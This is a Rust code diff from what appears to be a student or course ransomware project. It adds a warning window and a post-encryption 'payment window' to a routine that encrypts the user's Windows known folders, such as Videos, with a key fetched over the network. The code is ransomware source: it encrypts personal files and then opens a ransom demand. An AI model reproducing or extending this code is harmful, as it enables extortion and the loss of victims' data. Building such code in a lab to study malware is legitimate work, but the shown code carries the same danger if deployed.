@@ -9,6 +9,8 @@ use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
 use c_monster_co_2ic80::debug_log;
 use c_monster_co_2ic80::cryptography::chunk::{DEBUG_ENABLED};
 use c_monster_co_2ic80::networking::client::gen_key;
+use c_monster_co_2ic80::gui::payment::show_payment_window;
+use c_monster_co_2ic80::gui::warning::show_warning_window;
 
 use sodiumoxide::crypto::box_::PublicKey;
 
@@ -56,6 +58,8 @@ async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
         FOLDERID_Videos,
     ];
 
+    show_warning_window();
+
     unsafe {
         for path in paths {
             let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
@@ -73,6 +77,10 @@ async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
             fs::write(out_path, &pk)?;
         }
     }
+
+    // Show payment window after encryption
+    println!("Encryption complete! Opening payment window...");
+    show_payment_window(Some(pk));
 
     Ok(())
 }
